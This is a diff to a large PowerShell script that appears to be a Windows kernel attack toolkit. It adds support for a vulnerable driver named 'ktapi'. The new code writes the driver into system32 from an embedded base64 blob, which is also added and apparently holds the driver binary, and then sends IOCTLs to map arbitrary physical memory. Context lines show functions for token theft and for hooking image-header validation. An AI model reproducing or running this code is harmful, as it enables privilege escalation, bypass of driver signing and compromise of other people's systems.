@@ -3651,14 +3651,14 @@ if ($null -ne $va -and $va -ne 0L) {
 Write-Host
 #>
 
-# "ipctype", "mtxvxd", "winio", "DevMem", "iobios", "wdisvhost", "ASMMAP", "LallaMon", "SliffDriver", "pmxdrv"
+# "ipctype", "mtxvxd", "winio", "DevMem", "iobios", "wdisvhost", "ASMMAP", "LallaMon", "SliffDriver", "pmxdrv", "ktapi"
 Function Map-VirtualAddress {
     param (
       [IntPtr]$VA = [IntPtr]::Zero,
       [Int64]$PA = 0L,
 
       [Int32]$BlockSize,
-      [ValidateSet("ipctype", "mtxvxd", "winio", "DevMem", "iobios", "wdisvhost", "ASMMAP", "LallaMon", "SliffDriver", "pmxdrv")]
+      [ValidateSet("ipctype", "mtxvxd", "winio", "DevMem", "iobios", "wdisvhost", "ASMMAP", "LallaMon", "SliffDriver", "pmxdrv", "ktapi")]
       [String]$DriverName,
       [IntPtr]$handle = [IntPtr]::Zero
     )
@@ -3742,6 +3742,11 @@ Function Map-VirtualAddress {
                 Import-EmbeddedBlock -BlockName pmxdrv -OutPath 'C:\windows\system32\pmxdrv64.sys' | Out-Null
             }
         }
+        "ktapi" {
+            if (-not [File]::Exists("C:\windows\system32\ktapi.sys")) {
+                Import-EmbeddedBlock -BlockName ktapi -OutPath 'C:\windows\system32\ktapi.sys' | Out-Null
+            }
+        }
     }
 
     $IOCTL = 0x0
@@ -3759,6 +3764,7 @@ Function Map-VirtualAddress {
         "LallaMon"    { $IOCTL = 0xA00A2800  }
         "SliffDriver" { $IOCTL = 0x80002004  }
         "pmxdrv"      { $IOCTL = 0x00222AB8  }
+        "ktapi"       { $IOCTL = 0x82007000  }
     }
 
     if ($DriverName -eq 'ipctype') {
@@ -3810,6 +3816,20 @@ Function Map-VirtualAddress {
         # In-place tracking configuration
         $OutBuffer = [IntPtr]::Zero
         $OutBufferSize = 0
+
+    } elseif ($DriverName -eq 'ktapi') {
+
+        $Handle   = Get-FileHandle -FileName 'ktapi'
+        if ($Handle -eq $null -or $Handle -eq 0) {
+            throw "Cant get device handle" }
+
+        $DataSize      = 0x18
+        $DataPtr       = New-IntPtr -Size 0x18
+        $OutBuffer     = [IntPtr]$DataPtr
+        $OutBufferSize = 0x18
+    
+        [marshal]::WriteInt64($DataPtr, 0x08, $PA)
+        [marshal]::WriteInt32($DataPtr, 0x14, $BlockSize)
 
     } elseif ($DriverName -eq 'mtxvxd') {
 
@@ -3966,6 +3986,9 @@ Function Map-VirtualAddress {
             $va = [marshal]::ReadInt64($OutBuffer)
             [marshal]::FreeHGlobal($OutBuffer)
             return $va
+        } elseif ($DriverName -eq 'ktapi') {
+            $va = [marshal]::ReadInt64($DataPtr, 0)
+            return $va
         } elseif ($DriverName -eq 'ipctype') {
             $va = [marshal]::ReadInt64($DataPtr, 0x14)
             return $va
@@ -4026,7 +4049,7 @@ Function Unmap-VirtualAddress {
         [Parameter(Mandatory=$true, Position=0)]
         [Object]$MappedAddress,
         
-        [ValidateSet("ipctype", "mtxvxd", "winio", "DevMem", "iobios", "wdisvhost", "ASMMAP", "LallaMon", "SliffDriver", "pmxdrv")]
+        [ValidateSet("ipctype", "mtxvxd", "winio", "DevMem", "iobios", "wdisvhost", "ASMMAP", "LallaMon", "SliffDriver", "pmxdrv", "ktapi")]
         [String]$DriverName
     )
     [Int32]$MapSize = 0
@@ -4101,6 +4124,11 @@ Function Unmap-VirtualAddress {
                 Import-EmbeddedBlock -BlockName pmxdrv -OutPath 'C:\windows\system32\pmxdrv64.sys' | Out-Null
             }
         }
+        "ktapi" {
+            if (-not [File]::Exists("C:\windows\system32\ktapi.sys")) {
+                Import-EmbeddedBlock -BlockName ktapi -OutPath 'C:\windows\system32\ktapi.sys' | Out-Null
+            }
+        }
     }
 
     $IOCTL     = 0
@@ -4119,6 +4147,12 @@ Function Unmap-VirtualAddress {
             [marshal]::WriteInt64($DataPtr, 0x14, $ActualAddress)
             $IOCTL = -2146426812 
             $Handle = Get-FileHandle -FileName 'ipctype'
+        }
+        "ktapi" {
+            $DataSize = 8
+            $DataPtr = New-IntPtr -Size 8 -InitialValue $ActualAddress -UsePointerSize
+            $IOCTL = 0x82007100 
+            $Handle = Get-FileHandle -FileName 'ktapi'
         }
         "mtxvxd" { 
             $DataSize = 8 
@@ -5239,9 +5273,9 @@ function Invoke-SeValidateImageHeaderHook {
 
     process {
 
-        $osBuild      = (Get-CimInstance -ClassName Win32_OperatingSystem).BuildNumber
-        $deviceGuard  = Get-CimInstance -Namespace "root\Microsoft\Windows\DeviceGuard" -ClassName "Win32_DeviceGuard"
-        $isVbsRunning = $deviceGuard.VirtualizationBasedSecurityStatus -eq 2
+        $osBuild      = gwmi -ClassName Win32_OperatingSystem | select -ExpandProperty BuildNumber
+        $deviceGuard  = gwmi -ClassName "Win32_DeviceGuard" -Namespace "root\Microsoft\Windows\DeviceGuard" | select -ExpandProperty VirtualizationBasedSecurityStatus
+        $isVbsRunning = $deviceGuard -eq 2
 
         if ($osBuild -ge 22000 -and $isVbsRunning) {
             Write-Host "Unsupported: Active VBS on Windows 11 & Above, BSOD RISK upon subsequent driver loading." -ForegroundColor Yellow
@@ -6904,6 +6938,101 @@ function Invoke-TokenSteal {
 }
 #endregion
 #region Drivers
+## ktapi ##
+<#
+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
+hKZn/ZbxwdAoyhHD/h8=
+#>
+## END ##
 ## pcdsrvc ##
 <#
 7XwJXFPH9vBkAcJmQIiiokaMiiJ4IaggLrkQ9EaDIotSRQUhLBWBhgSxagUCSLiiaLW1vj6LrW3tZn2t+wq4AO5ad1pFaysYi2jr3prvzL03END2vd/3+y/f
